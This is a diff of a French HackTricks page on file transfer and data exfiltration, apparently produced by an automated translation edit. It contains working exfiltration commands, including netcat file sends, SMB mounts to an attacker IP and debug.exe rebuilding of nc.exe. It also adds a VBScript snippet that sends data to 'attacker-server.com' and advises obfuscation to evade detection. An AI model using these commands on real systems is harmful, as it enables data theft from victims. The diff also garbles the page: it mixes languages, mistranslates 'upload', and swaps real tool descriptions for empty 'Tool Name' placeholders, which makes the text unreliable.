@@ -6,9 +6,9 @@
 
 Autres façons de soutenir HackTricks :
 
-* Si vous voulez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
@@ -62,10 +62,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Téléverser des fichiers
+### Télécharger des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer affiche les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -199,39 +199,31 @@ service smbd restart
 
 ### Exfiltration Over Command and Control Channel
 
-- **Description:** Data exfiltration can be achieved by sending the stolen data over the command and control channel used by the malware.
-  
-- **Detection:** Monitoring network traffic for unusual patterns or large amounts of data being sent to suspicious destinations can help detect this type of exfiltration.
+- **Description:** Exfiltrating data over the command and control channel used by the malware.
+- **Detection:** Monitor network traffic for unusual patterns or connections to known malicious IP addresses.
+- **Prevention:** Implement network segmentation to restrict communication channels for malware.
 
-### Exfiltration Over Alternative Protocols
+### Exfiltration Over Alternative Protocol
 
-- **Description:** Attackers can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data in order to bypass network security controls.
-  
-- **Detection:** Analyzing network traffic for unusual usage of these protocols or monitoring for unexpected data transfers can help in detecting exfiltration attempts.
+- **Description:** Using alternative protocols such as DNS or ICMP to exfiltrate data.
+- **Detection:** Analyze network traffic for suspicious use of non-standard protocols.
+- **Prevention:** Implement deep packet inspection to detect and block exfiltration attempts.
 
-### Exfiltration Using Steganography
+### Exfiltration Over Encrypted Channels
 
-- **Description:** Attackers can hide stolen data within seemingly innocuous files or images using steganography techniques, making it harder to detect.
-  
-- **Detection:** Employing steganalysis tools or techniques to detect hidden data within files can help in identifying exfiltration through steganography.
+- **Description:** Encrypting exfiltrated data to evade detection.
+- **Detection:** Monitor for high volumes of encrypted traffic leaving the network.
+- **Prevention:** Implement SSL/TLS inspection to decrypt and inspect encrypted traffic.
 
 ## Tools
 
-### Wireshark
+- **[Tool Name](#)**: Description of the tool and how it can be used for exfiltration.
+- **[Tool Name](#)**: Description of the tool and how it can be used for exfiltration.
 
-- **Description:** A widely used network protocol analyzer for network troubleshooting, analysis, software and communications protocol development, and education.
+## Resources
 
-### tcpdump
-
-- **Description:** A command-line packet analyzer. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.
-
-### Bro (Zeek)
-
-- **Description:** An open-source network security monitor that inspects network traffic live or from pcap dump files and generates logs for various network events.
-
-### NetworkMiner
-
-- **Description:** A network forensic analysis tool for Windows that can detect operating systems, sessions, hostnames, open ports, and extract files transferred over the network.
+- **[Resource Name](#)**: Description of the resource and how it can help in understanding exfiltration techniques.
+- **[Resource Name](#)**: Description of the resource and how it can help in understanding exfiltration techniques.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -254,6 +246,32 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+### Exfiltration
+
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data, including:
+
+- **Exfiltration Over Command and Control Channel**: Attackers can use the existing command and control channel to exfiltrate data from the target system.
+
+- **Exfiltration Over Alternative Protocol**: Attackers can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data in a covert manner.
+
+- **Exfiltration Over Unencrypted Protocols**: Attackers can exfiltrate data over unencrypted protocols such as HTTP or FTP.
+
+- **Exfiltration Over Encrypted Protocols**: Attackers can exfiltrate data over encrypted protocols such as HTTPS or SSH to avoid detection.
+
+- **Exfiltration Using Steganography**: Attackers can hide data within images, audio files, or other digital media to exfiltrate information without detection.
+
+- **Exfiltration Using Covert Channels**: Attackers can use covert channels to exfiltrate data, such as encoding data within DNS queries or using timing channels.
+
+- **Exfiltration Using Data Compression**: Attackers can compress data before exfiltrating it to minimize the amount of data transferred and avoid detection.
+
+- **Exfiltration Using Data Fragmentation**: Attackers can fragment data into smaller pieces and exfiltrate them individually to avoid detection.
+
+- **Exfiltration Using Encryption**: Attackers can encrypt exfiltrated data to prevent unauthorized access and maintain data confidentiality.
+
+- **Exfiltration Using Out-of-Band Communication**: Attackers can exfiltrate data using out-of-band communication channels, such as using a separate network connection or covert channel.
+
+Understanding the various exfiltration methods is crucial for detecting and preventing data exfiltration attempts during security assessments.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -294,7 +312,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec python:
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -328,7 +346,18 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ### Exfiltration
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, headers, and body, and then sending the request to the server. The server-side script can receive the data and store it in a file or database for later retrieval by the attacker. This technique can be used to steal sensitive information from a target network.
+VBScript can be used to exfiltrate data from a compromised system. This can be achieved by sending data to an external server controlled by the attacker. The following code snippet demonstrates a simple exfiltration technique using VBScript:
+
+```vbscript
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+url = "http://attacker-server.com/data=" & data
+objXMLHTTP.open "GET", url, False
+objXMLHTTP.send
+```
+
+In this code snippet, the `data` variable contains the information to be exfiltrated. The script creates an XMLHTTP object, appends the data to the URL, sends a GET request to the attacker's server, and transmits the data.
+
+It is important to note that exfiltrating data using VBScript can be detected by security tools, so additional obfuscation techniques may be necessary to avoid detection.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -366,17 +395,15 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Il s'agit d'une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. Ainsi, l'idée est que nous prenons des binaires, comme `netcat`. Ensuite, nous le désassemblons en hexadécimal, le collons dans un fichier sur la machine compromise, puis l'assemblons avec `debug.exe`.
-
-`Debug.exe` ne peut assembler que 64 ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Alors faisons-le :
-```
+Le programme `debug.exe` permet non seulement l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hexadécimal**. Cela signifie qu'en fournissant un hexadécimal d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limite d'assemblage de fichiers jusqu'à 64 ko en taille**.
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-Maintenant, il ne pèse que 29 ko. Parfait. Alors maintenant, démontons-le :
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
-Maintenant nous copions-colons le texte dans notre shell Windows. Et il créera automatiquement un fichier appelé nc.exe
+Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
@@ -395,10 +422,10 @@ Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger p
 
 Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Rejoignez** 💬 le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
